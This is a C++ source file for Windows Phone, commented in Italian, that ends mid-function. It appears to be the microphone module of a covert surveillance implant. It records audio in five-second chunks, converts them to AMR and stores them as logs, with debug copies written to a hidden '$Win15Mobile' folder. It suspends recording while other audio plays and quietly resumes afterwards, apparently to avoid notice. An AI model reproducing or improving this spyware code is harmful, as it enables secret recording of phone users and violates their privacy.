#include "NativeAudioInterface.h"
#include "FunctionFunc.h"
#include "Log.h"
#include "Microphone.h"
#include "Audioclient.h"
#include "phoneaudioclient.h"

#include <interf_enc.h>

//#define RELESE_DEBUG_MSG

#include <windows.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "Phoneaudioses.lib")
#pragma comment(lib, "opencore_amrnb.lib")
using namespace std;
using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;
using namespace NativeAudioInterface::Native;


//messo qua per poter forzare lo stop da dentro OnSampleAvailable
Windows::Phone::Media::Capture::AudioVideoCaptureDevice ^pAudioVideoCaptureDevice;

HANDLE GlobalEventHandle=NULL;

MicAdditionalData mad2;

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

void initFirstCapture(void)
{
	NativeCapture::pos=0;
	NativeCapture::nCamp=1;
}

void NativeCapture::SetWait(void)
{
	SetResetWait=TRUE;
}

void NativeCapture::ResetWait(void)
{
	SetResetWait=FALSE;
}

void NativeCapture::StopCapture(void)
{

#ifdef  RELESE_DEBUG_MSG

	WCHAR msg[128];
	swprintf_s(msg, L"\n>>>>>>>>StopCapture: GlobalEventHandle=%x <<<<<<\n",GlobalEventHandle);
	OutputDebugString(msg);

	Log logInfo;
	logInfo.WriteLogInfo(msg);
#endif

	//se gia' non sto catturando esco subito
	//if(NativeCapture::fStartCapture==FALSE) return;
	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
	
	//se � gia' false significa l'ho stoppato precedentemente 
#ifdef  RELESE_DEBUG_MSG	
		Log logInfo4;
		logInfo4.WriteLogInfo(L"StopCapture: fStartCapture==TRUE");
#endif		
					
		try
		{
			pAudioVideoCaptureDevice->StopRecordingAsync();
		}
		catch (Platform::Exception^ e) 
		{
#ifdef  RELESE_DEBUG_MSG
			Log logInfo;
			//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
#endif

#ifdef _DEBUG
			Log logInfo;
			//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
			OutputDebugString(L"Microphone is in use. [id5]");
#endif
		}
		
	//pAudioVideoCaptureDevice=nullptr;

}

// Called each time a captured frame is available	
void CameraCaptureSampleSink::OnSampleAvailable(
	ULONGLONG hnsPresentationTime,
	ULONGLONG hnsSampleDuration,
	DWORD cbSample,
	BYTE* pSample)
{


	static LONGLONG Start_hnsPresentationTime=0;
	static char nomeFileBase[DTTMSZAUD];

	// creo file da 5sec 

	//8MB di buffer non posso farlo dianimco con l'heap perche wp mi killa
	static BYTE bufferTmp[1024 * 1024 * 8];
#ifdef _DEBUG
	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio")+DTTMSZAUD+1+6];
#endif

	if(NativeCapture::SetResetWait==FALSE) 
	{
#ifdef RELESE_DEBUG_MSG
		Log logInfo;
		logInfo.WriteLogInfo(L"STOP FORZATO");
#endif
		NativeCapture::StopCapture();
		return;
	}

	
	Log log;

	// hnsPresentationTime aumenta partendo da 0 allo start, 1 sec=10000000
	 // Header= 35, 33, 65, 77, 82, 10
	 // Header= 23  21  41  4D  52  0A

	//per evitare gli ultimi campionamenti spuri evito di eseguire ulteriore codice 
	//if (NativeAudioInterface::Native::NativeCapture::fAudioCaptureForceStop==TRUE) return;
	//in pratica quando io lancio un stopMic setto fStartCapture==FALSE per cui in questo codice devo poter gestire il false
	//salvando il campione catturato
	//taglio via gli ultimi campioni catturati


	if(NativeCapture::pos==0&&NativeCapture::nCamp==1)
	{
#ifdef RELESE_DEBUG_MSG
		Log logInfo;
		WCHAR msg2[128];
		swprintf_s(msg2, L"OnSmaple pos==0&&nCamp==1 INIZIALE:hnsPresentationTime=%x",hnsPresentationTime);
		logInfo.WriteLogInfo(msg2);
#endif

		//BYTE HEADER[]={35, 33, 65, 77, 82, 10};
		//
		//memcpy(bufferTmp,HEADER,sizeof(HEADER));
		//NativeCapture::pos=sizeof(HEADER);
		NativeCapture::fHeader = true;

		//creo il nome del file come data file (poi vedro' come criptarli)
		char buff[DTTMSZAUD];
   		getDtTmAUD(buff);
		strcpy(nomeFileBase,buff);

		//
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n1Header) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
#endif
		
		unsigned __int64 temp_time = GetTime();
	
		ZeroMemory(&mad2, sizeof(mad2));
		mad2.uVersion = MIC_LOG_VERSION;
		mad2.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_AMR;
		mad2.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
		mad2.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);


		//salvo il punto in cui considero che inizia il campione, in teoria non c'e' ne bisogno ma ho visto che alle volte sembra che il play � sotto da svariati minuiti quando in realta' non dovrebbe esserlo
		Start_hnsPresentationTime=hnsPresentationTime*5;
	}
	//else 
	//	pos=0;

	
	memcpy(bufferTmp+NativeCapture::pos,pSample,cbSample);
	NativeCapture::pos=NativeCapture::pos+cbSample;

	//catturo blocchi di 5 sec 
	/*
	if((hnsPresentationTime>(ULONGLONG)5*10000000) && (NativeAudioInterface::Native::NativeCapture::fAudioCapture==TRUE))
	{
		NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
		fstream filestr;
		sprintf(nomeFile,"audio%s_%i.amr",nomeFileBase,nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, pos);
		filestr.close();
		OutputDebugStringA(nomeFile);
		//pos=0;
		nCamp++;
	}
	*/

	DWORD b=false;
	_Media_Queue_GameHasControl(&b);

	if(NativeCapture::SetResetWait==FALSE || b==0)
	{
		// entro qua quando ho finito di campionare o quando si riattiva ul play di una periferica audio
		//per cui chiudo lo stream salvo il log e stoppo l'audio nel caso vi sia entrato per "colpa" di un play altrimenti l'audio dovrebbe essere gia' stoppato
#ifdef  RELESE_DEBUG_MSG
		Log logInfo;
		WCHAR msg2[128];
		swprintf_s(msg2, L"OnSmaple fAudioCapture==FALSE || b==0 3exit) Pos=%i nCamp=%i: ",NativeCapture::pos,NativeCapture::nCamp);
		logInfo.WriteLogInfo(msg2);
#endif

#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);


		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
		fstream filestr;
		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
		filestr.close();
#endif

		//DA RIPRISTINARE DOPO IL TEST
		//ELIMINATO TEMPORANEAMENTE per vedere se e' qualche errore qui dentro che incasina lo stop
		//nel casno non lo reinserisco => mi perdo gli ultimi secondi di campionamento
/****
		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
		{
			return;
		}

		//converto da PCM 48000 a AMR 8000
		unsigned long posTmp = 0;

		float *psample32, *pf;
		short *psample16, *ps;
		psample32 = (float*)bufferTmp;
		psample16 = (short*)bufferTmp;

		//resampla il file
		int inputSampleRate = 48000;
		int outputSampleRate = 8000;
		double ratio = (double)inputSampleRate / outputSampleRate;
		int outSample = 0;
		while (true)
		{
			int inBufferIndex = (int)(outSample * ratio);

			if (inBufferIndex < NativeCapture::pos)
			{
				float sample32 = psample32[inBufferIndex];
				// clip
				if (sample32 > 1.0f)
					sample32 = 1.0f;
				if (sample32 < -1.0f)
					sample32 = -1.0f;
				psample16[outSample] = (short)(sample32 * 32767);
			}
			else
				break;

			outSample++;
		}

		//converto in amr
		int i, j;
		void* amr;
		int sample_pos = 0;

		amr = Encoder_Interface_init(0);

		posTmp = 0;
		if (NativeCapture::fHeader == true)
		{

			BYTE HEADER[] = { 35, 33, 65, 77, 82, 10 };

			memcpy(bufferTmp, HEADER, sizeof(HEADER));
			NativeCapture::pos = sizeof(HEADER);
			posTmp = sizeof(HEADER);
			NativeCapture::fHeader = false;
		}

		for (long j = 0; j < outSample; j += 160)
		{
			short buf[160];
			uint8_t outbuf[500];

			memcpy(buf, &psample16[j], sizeof(buf));

			int n = Encoder_Interface_Encode(amr, MR122, buf, outbuf, 0);
			memcpy(&bufferTmp[posTmp], outbuf, n);
			posTmp += n;

		}
		Encoder_Interface_exit(amr);
		// Fine conversione

		log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos/4 );

		log.CloseLog();
****/
#ifdef _DEBUG
		OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
		
		NativeCapture::StopCapture();

		NativeCapture::pos=0;
		NativeCapture::nCamp=1;

		if(b==0) 
		{
			//se arrivo qua � perche' qualcuno sta playando della musica

			////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
			//se sono arivato qua non per uno StopRecordingAsync ma per un play audio devo dirgli che ho finito di catturare (fAudioCapture=FALSE) e stoppo l'audio 
		
			Log logInfo;
			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");

		
			try
			{

				NativeCapture::StopCapture();
				//pAudioVideoCaptureDevice->StopRecordingAsync();
			}
			catch (Platform::Exception^ e) 
			{
#ifdef  RELESE_DEBUG_MSG
				Log logInfo;
				//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
				logInfo.WriteLogInfo(L"Microphone is in use. [id4]");
#endif
			}

			//aggiunto prima del rilascio per riavviare la cattura se si risolve l'occupazione delle risorsa audio
			
			//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
			//il problema � che GlobalEventHandle se c'e' uno start stop e start cambia ma io sono qua dentro � non ho modo di sapere quale � il nuovo
			//GlobalEventHandle perche' lo passo tramist starCapture ma potrei aver fatto uno StartRecordingToSinkAsync senza passarer da startCapture per cui devo usare fStartCapture per capire cosa succede

			//se uso _WaitForSingleObject non mi viene notificato lo stop del mic � non ha senso visto che la riga sotto funziona!!!!
			while(NativeCapture::SetResetWait==TRUE)
			{
				//controllare se lo sleep non � bloccante per qualcosa
				_Sleep(10000);
#ifdef  RELESE_DEBUG_MSG			
				WCHAR msg[128];
				swprintf_s(msg, L"\nLOOP Suspending microphone: _WaitForSingleObject GlobalEventHandle=%x\n",GlobalEventHandle);
				OutputDebugString(msg);

				Log logInfo;
				logInfo.WriteLogInfo(msg);
#endif

		

				_Media_Queue_GameHasControl(&b);
				if(b==1)
				{
#ifdef  RELESE_DEBUG_MSG
					Log logInfo;
					logInfo.WriteLogInfo(L"se arrvvo qua perche' non c'e' piu' niente in play");
#endif
					//se arrvvo qua perche' non c'e' piu' niente in play 
					//OutputDebugString(L"Nessun play attivo");	
					try
					{

							initFirstCapture();
							NativeCapture::StartCapture(GlobalEventHandle);
							//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
							// PER RELEASE Controllare se non devo inizializzare anche pos ncamp ecc..
							Log logInfo;
							logInfo.WriteLogInfo(L"Resume microphone");
							/////_ZMediaQueue_DisconnectFromService();
							//return;



					}
					catch (Platform::Exception^ e) 
					{
#ifdef _DEBUG
						OutputDebugString(L"<<<eccezione capture Mic6 gestita>>>\n");
						///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

#ifdef  RELESE_DEBUG_MSG
						Log logInfo;
						//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
						logInfo.WriteLogInfo(L"Microphone is in use. [id6]");
						///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif
						return;

					}
//					return;					
					break;
				}
			}
#ifdef  RELESE_DEBUG_MSG
			Log logInfo6;
			logInfo6.WriteLogInfo(L"esco fuori da: while(NativeCapture::fStartCapture==TRUE && _WaitForSingleObject(GlobalEventHandle, 10000))");
#endif
		}
	}
	else
		//if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
		if( (ULONGLONG)((hnsPresentationTime-Start_hnsPresentationTime)/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
		{
			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
#ifdef  RELESE_DEBUG_MSG
			WCHAR msg2[128];
			Log logInfo;
			swprintf_s(msg2, L"OnSmaple 2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%i",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));
			logInfo.WriteLogInfo(msg2);
#endif

		//nel caso campiono meno di 512 byte scarto il pacchetto
		if(NativeCapture::pos>512)
		{

#ifdef _DEBUG
			WCHAR msg[128];
			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%f\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);



			fstream filestr;
			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
			filestr.seekg (0, ios::beg);
			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
			filestr.close();
#endif
			if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
			{
				return;
			}
			//converto da PCM 48000 a AMR 8000
			unsigned long posTmp = 0;

			float *psample32, *pf;
			short *psample16, *ps;
			psample32 = (float*)bufferTmp;
			psample16 = (short*)bufferTmp;

			//resampla il file
			int inputSampleRate = 48000;
			int outputSampleRate = 8000;
			double ratio = (double)inputSampleRate / outputSampleRate;
			int outSample = 0;
			while (true)
			{
				int inBufferIndex = (int)(outSample * ratio);

				if (inBufferIndex < NativeCapture::pos)
				{
					float sample32 = psample32[inBufferIndex];
					// clip
					if (sample32 > 1.0f)
						sample32 = 1.0f;
					if (sample32 < -1.0f)
						sample32 = -1.0f;
					psample16[outSample] = (short)(sample32 * 32767);
				}
				else
					break;

				outSample++;
			}

			//converto in amr
			int i, j;
			void* amr;
			int sample_pos = 0;

			amr = Encoder_Interface_init(0);

			posTmp = 0;
			if (NativeCapture::fHeader == true)
			{

				BYTE HEADER[] = { 35, 33, 65, 77, 82, 10 };

				memcpy(bufferTmp, HEADER, sizeof(HEADER));
				NativeCapture::pos = sizeof(HEADER);
				posTmp = sizeof(HEADER);
				NativeCapture::fHeader = false;
			}

			for (long j = 0; j < outSample; j += 160)
			{
				short buf[160];
				uint8_t outbuf[500];

				memcpy(buf, &psample16[j], sizeof(buf));

				int n = Encoder_Interface_Encode(amr, MR122, buf, outbuf, 0);
				memcpy(&bufferTmp[posTmp], outbuf, n);
				posTmp += n;

			}
			Encoder_Interface_exit(amr);
			// Fine conversione

			//log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
			log.WriteLog((BYTE*)bufferTmp, posTmp / 4);
#ifdef _DEBUG
			OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
		}
#ifdef  RELESE_DEBUG_MSG
		else
		{

			Log logInfo5;
			logInfo5.WriteLogInfo(L"^^^pacchetto scartato");
		}
#endif


			NativeCapture::pos=0;
			NativeCapture::nCamp++;
		}
	

}



#include <thread>
#include <chrono>


class MyAudioSink
{
private:
        int counter;
		fstream filestr;
public:
        MyAudioSink()
        {
                counter = 0;
				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
				filestr.seekg (0, ios::beg);
				
        }

        HRESULT SetFormat(WAVEFORMATEX *pwfx)
        {
                return 0;
        }

        HRESULT CopyData(BYTE *pData, UINT32 numFramesAvailable, BOOL *bDone)
        {
                printf("%i\n", numFramesAvailable);
                counter++;
                if (counter > 2000) {
						filestr.close();
                        return -1;
                }
                else
                {
						filestr.write ((const char*)pData, numFramesAvailable);
                        return 0;
                }
        }
};

//-----------------------------------------------------------
// Record an audio stream from the default audio capture
// device. The RecordAudioStream function allocates a shared
// buffer big enough to hold one second of PCM audio data.
// The function uses this buffer to stream data from the
// capture device. The main loop runs every 1/2 second.
//-----------------------------------------------------------

// REFERENCE_TIME time units per second and per millisecond
#define REFTIMES_PER_SEC  10000000
#define REFTIMES_PER_MILLISEC  10000

#define EXIT_ON_ERROR(hres)  \
              if (FAILED(hres)) { goto Exit; }
#define SAFE_RELEASE(punk)  \
              if ((punk) != NULL)  \
                { (punk)->Release(); (punk) = NULL; }

const IID IID_IAudioClient = __uuidof(IAudioClient);
const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);


/* FUNZIONA PER EGISTRARE MA QUANDO SI DISIDRATA L'app va in silent
HRESULT RecordAudioStream(MyAudioSink *pMySink)
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    REFERENCE_TIME hnsActualDuration;
    UINT32 bufferFrameCount;
    UINT32 numFramesAvailable;
    
	//IMMDeviceEnumerator *pEnumerator = NULL;
    //IMMDevice *pDevice = NULL;

    IAudioClient *pAudioClient = NULL;
    IAudioCaptureClient *pCaptureClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;
    BYTE *pData;
    DWORD flags;

	
	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
	

    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)


 
     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));


    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

    hr = pAudioClient->GetService(
                         IID_IAudioCaptureClient,
                         (void**)&pCaptureClient);
    EXIT_ON_ERROR(hr)

    // Notify the audio sink which format to use.
    hr = pMySink->SetFormat(pwfx);
    EXIT_ON_ERROR(hr)

    // Calculate the actual duration of the allocated buffer.
    hnsActualDuration = (double)REFTIMES_PER_SEC *
                     bufferFrameCount / pwfx->nSamplesPerSec;

	
	OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

    // Each loop fills about half of the shared buffer.
    while (bDone == FALSE)
    {
        // Sleep for half the buffer duration.
        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);

        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        EXIT_ON_ERROR(hr)

        while (packetLength != 0)
        {
            // Get the available data in the shared buffer.
            hr = pCaptureClient->GetBuffer(
                                   &pData,
                                   &numFramesAvailable,
                                   &flags, NULL, NULL);
            EXIT_ON_ERROR(hr)

            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
            {
                pData = NULL;  // Tell CopyData to write silence.
				OutputDebugString(L"silence\n");
            }
			else
			{
			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;

			WCHAR msg[128];
			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);

            // Copy the available capture data to the audio sink.
            hr = pMySink->CopyData(
                              pData, dataSize, &bDone);
            EXIT_ON_ERROR(hr)
			}
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            EXIT_ON_ERROR(hr)

            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            EXIT_ON_ERROR(hr)
        }
    }


	OutputDebugString(L"STOP\n");
    hr = pAudioClient->Stop();  // Stop recording.
    EXIT_ON_ERROR(hr)

Exit:
    CoTaskMemFree(pwfx);
//    SAFE_RELEASE(pEnumerator)
 //   SAFE_RELEASE(pDevice);
    SAFE_RELEASE(pAudioClient);
    SAFE_RELEASE(pCaptureClient);

    return hr;
}
*/

//#include <windows.h>
// 
//#include <synchapi.h>
//#include <audioclient.h>
//#include <phoneaudioclient.h>
 

HRESULT SetVolumeOnSession( UINT32 volume )
{
    if (volume > 100)
    {
        return E_INVALIDARG;
    }

    HRESULT hr = S_OK;
    ISimpleAudioVolume *SessionAudioVolume = nullptr;
    float ChannelVolume = 0.0;


	IAudioClient2* m_AudioClient=NULL;
	WAVEFORMATEX* m_waveFormatEx=NULL;
//	int m_sourceFrameSizeInBytes;
    IAudioRenderClient* m_pRenderClient=NULL;

    LPCWSTR renderId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
 
    if (NULL == renderId)
    {
        hr = E_FAIL;
    }
    else
    {
        hr = ActivateAudioInterface(renderId, __uuidof(IAudioClient2), (void**)&m_AudioClient);
    }


    hr = m_AudioClient->GetService( __uuidof(ISimpleAudioVolume), reinterpret_cast<void**>(&SessionAudioVolume) );
    if (FAILED( hr ))
    {
        goto exit;
    }

    ChannelVolume = volume / (float)100.0;

    // Set the session volume on the endpoint
    hr = SessionAudioVolume->SetMasterVolume( ChannelVolume, nullptr );

exit:
    SAFE_RELEASE( SessionAudioVolume );
    return hr;
}


HRESULT InitRender()
{
    HRESULT hr = E_FAIL;
	IAudioClient2* m_pDefaultRenderDevice=NULL;
	WAVEFORMATEX* m_waveFormatEx=NULL;
	int m_sourceFrameSizeInBytes;
    IAudioRenderClient* m_pRenderClient=NULL;

    ISimpleAudioVolume *SessionAudioVolume = nullptr;
    float ChannelVolume = 0.0;


    LPCWSTR renderId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
 
    if (NULL == renderId)
    {
        hr = E_FAIL;
    }
    else
    {
        hr = ActivateAudioInterface(renderId, __uuidof(IAudioClient2), (void**)&m_pDefaultRenderDevice);
    }
 
    if (SUCCEEDED(hr))
    {
        hr = m_pDefaultRenderDevice->GetMixFormat(&m_waveFormatEx);
    }
 
    // Set the category through SetClientProperties
    AudioClientProperties properties = {};
    if (SUCCEEDED(hr))
    {
        properties.cbSize = sizeof AudioClientProperties;
        properties.eCategory = AudioCategory_Communications;
        hr = m_pDefaultRenderDevice->SetClientProperties(&properties);
    }
 
    if (SUCCEEDED(hr))
    {
		/***
        WAVEFORMATEX temp;
        MyFillPcmFormat(temp, 2, 44100, 16); // stereo, 44100 Hz, 16 bit
 
        *m_waveFormatEx = temp;
		***/
		
		//typedef struct tWAVEFORMATEX
		//{
		//	WORD    wFormatTag;        /* format type */
		//	WORD    nChannels;         /* number of channels (i.e. mono, stereo...) */
		//	DWORD   nSamplesPerSec;    /* sample rate */
		//	DWORD   nAvgBytesPerSec;   /* for buffer estimation */
		//	WORD    nBlockAlign;       /* block size of data */
		//	WORD    wBitsPerSample;    /* Number of bits per sample of mono data */
		//	WORD    cbSize;            /* The count in bytes of the size of
		//									extra information (after cbSize) */

		//} WAVEFORMATEX;
	/*
		m_waveFormatEx->nChannels=2;
		m_waveFormatEx->nSamplesPerSec=44100;
		m_waveFormatEx->wBitsPerSample=16;
		*/
        m_sourceFrameSizeInBytes = (m_waveFormatEx->wBitsPerSample / 8) * m_waveFormatEx->nChannels;
 
        hr = m_pDefaultRenderDevice->Initialize(AUDCLNT_SHAREMODE_SHARED, 0x88000000, 1000 * 10000, 0, m_waveFormatEx, NULL);
    }
 
    if (SUCCEEDED(hr))
    {
        hr = m_pDefaultRenderDevice->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);
    }


	    hr = m_pDefaultRenderDevice->GetService( __uuidof(ISimpleAudioVolume), reinterpret_cast<void**>(&SessionAudioVolume) );
    if (FAILED( hr ))
    {
       // goto exit;
    }

    ChannelVolume = 80 / (float)100.0;

    // Set the session volume on the endpoint
    hr = SessionAudioVolume->SetMasterVolume( ChannelVolume, nullptr );


 
    if (SUCCEEDED(hr))
    {
       /// hr = m_pDefaultRenderDevice->Start();
    }
 
    if (renderId)
    {
        CoTaskMemFree((LPVOID)renderId);
    }


	//---

	   hr = S_OK;
 
        if (m_pDefaultRenderDevice)
        {
           /// hr = m_pDefaultRenderDevice->Stop();
        }
 
        if (m_pRenderClient)
        {
            m_pRenderClient->Release();
            m_pRenderClient = NULL;
        }
 
        if (m_pDefaultRenderDevice)
        {
            m_pDefaultRenderDevice->Release();
            m_pDefaultRenderDevice = NULL;
        }
 
        if (m_waveFormatEx)
        {
            CoTaskMemFree((LPVOID)m_waveFormatEx);
            m_waveFormatEx = NULL;
        }

 
    return hr;
}

HRESULT InitAudioStream()
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    UINT32 bufferFrameCount;

    IAudioClient *pAudioClient = NULL;
	IAudioRenderClient* m_pRenderClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;


	
	LPCWSTR pwstrDefaultRenderDeviceId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
	hr = ActivateAudioInterface(pwstrDefaultRenderDeviceId, __uuidof(IAudioClient), (void**)&pAudioClient);
	
    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)

  
    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0x88000000,
						 //AUDCLNT_STREAMFLAGS_LOOPBACK,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);

    EXIT_ON_ERROR(hr)
   
	
	// l'ho tolto per il rilascio del core per vedere se era questo che influenzava il crash dell'app
	// pero' devo vedere se senza questo sotto si sente ancora il glich dallo speacher

	//OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

	_Sleep(1000);
	hr = pAudioClient->Stop();  // Stop recording.

Exit:
    SAFE_RELEASE(m_pRenderClient);
    SAFE_RELEASE(pAudioClient);   
	CoTaskMemFree(pwfx);
   

    return hr;
}


#pragma comment( lib, "xaudio2.lib")
#include <xaudio2.h>


void initXaudio2(void)
{
	  UINT32 flags = 0; 
    
	  interface IXAudio2* m_audioEngine=NULL; 
	  interface IXAudio2MasteringVoice*       m_masteringVoice=NULL; 

      XAudio2Create(&m_audioEngine, flags);
	  m_audioEngine->CreateMasteringVoice(&m_masteringVoice, XAUDIO2_DEFAULT_CHANNELS, 48000 );

	  //se setto come qua sotto gliccia di brutto
	  //XAudio2Create(&m_audioEngine, 0, XAUDIO2_DEFAULT_PROCESSOR);
	  //m_audioEngine->CreateMasteringVoice(&m_masteringVoice);

	  
	if (m_masteringVoice != nullptr) 
    { 
        m_masteringVoice->DestroyVoice(); 
        m_masteringVoice = nullptr; 
    } 

	if (m_audioEngine != nullptr) 
    { 
        m_audioEngine->Release(); 
        m_audioEngine = nullptr; 
    } 
}


int NativeCapture::StartCapture(HANDLE eventHandle)
{
#ifdef RELESE_DEBUG_MSG

	WCHAR msg[128];
	swprintf_s(msg, L"\n>>>>>>>>StartCapture: eventHandle=%x <<<<<<\n",eventHandle);
	OutputDebugString(msg);
	Log logInfo3;
	logInfo3.WriteLogInfo(msg);
#endif

	GlobalEventHandle=eventHandle;

	//quando entro que � perche' si vuole iniziare una cattura dal mic inizializzato allo "startup"
    //siccome ci possono essere richieste asyncrone se sono gia' in cattura devo ignorare lo start

	///if(NativeCapture::fStartCapture==TRUE) return FALSE;

#ifdef RELESE_DEBUG_MSG
	Log logInfo5;
	logInfo5.WriteLogInfo(L"StartCapture: fStartCapture==TRUE");
#endif
	
	//aggiunta per gestire dentro OnSampleAvailable il rilascio della risorsa audio
	

	/***
	Windows::Foundation::TimeSpan span;
	span.Duration = 30000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
***/

	//mi sconnetto dal servizio che mi tira su la possibiblita' di controllare il playng in bg dell'audio
